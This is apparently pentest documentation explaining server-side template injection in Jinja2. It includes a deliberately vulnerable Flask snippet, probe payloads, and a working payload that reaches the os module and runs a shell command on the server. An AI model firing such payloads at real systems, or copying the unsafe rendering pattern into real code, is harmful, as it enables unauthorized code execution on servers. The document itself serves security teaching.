# **Pentest Documentation: Server-Side Template Injection (SSTI)**

## **Introduction**

**Server-Side Template Injection (SSTI)** is a critical web vulnerability that occurs when user input is concatenated
directly into a template without proper sanitization, allowing attackers to inject malicious template expressions. This
can lead to severe consequences of remote code execution (RCE), data leakage, and unauthorized actions on the server.

## **Understanding Server-Side Template Injection**

### **What is SSTI?**

Template engines are used in web applications to generate dynamic HTML pages. SSTI occurs when user-supplied input is
embedded directly into a template in an unsafe manner. If the template engine processes the input as code, an attacker
can execute arbitrary code on the server.

### **How Does SSTI Occur?**

SSTI vulnerabilities arise when:

- User input is **directly** inserted into templates without proper sanitization.
- The application uses **unsafe** methods to render templates.
- The template engine allows execution of arbitrary code (e.g., accessing attributes, invoking functions).

#### **Example of Vulnerable Code (Python with Jinja2):**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f'Hello {name}!'
    return render_template_string(template)
```

In this example, user input `name` is directly embedded into the template, making it vulnerable to SSTI.

## **Attack Scenario: Exploiting SSTI in Different Template Engines**

### **Identifying the Template Engine**

Before exploiting SSTI, it's crucial to identify the template engine in use. Clues can be found through:

- Error messages revealing the template engine.
- Syntax used in the templates (e.g., <code v-pre>{{ }}</code>, <code v-pre>{% %}</code>, `${ }`).

### **Exploitation Examples**

#### **Exploiting Jinja2 (Python)**

**Payload to Trigger SSTI:**

```plaintext
{{ 7*7 }}
```

**Expected Output:**

```
49
```

**Achieving Remote Code Execution:**

```plaintext
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Explanation:**

- `config.__class__.__init__.__globals__['os']` accesses the `os` module.
- `.popen('id').read()` executes the `id` command and reads the output.

## **Detection**

### **Manual Testing**

- **Inject Common SSTI Payloads:** Use payloads like <code v-pre>{{7*7}}</code>, `${7*7}`, `#{7*7}` in input fields to
  check for code execution.

- **Observe Responses:** If the server responds with evaluated expressions (e.g., `49`), SSTI is likely present.

## **Conclusion**

Server-Side Template Injection is a severe vulnerability that can lead to complete server compromise. By understanding
how SSTI occurs and implementing robust input validation and secure coding practices, developers and security
professionals can mitigate these risks effectively.

## **References**

- [HackTricks - Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection)
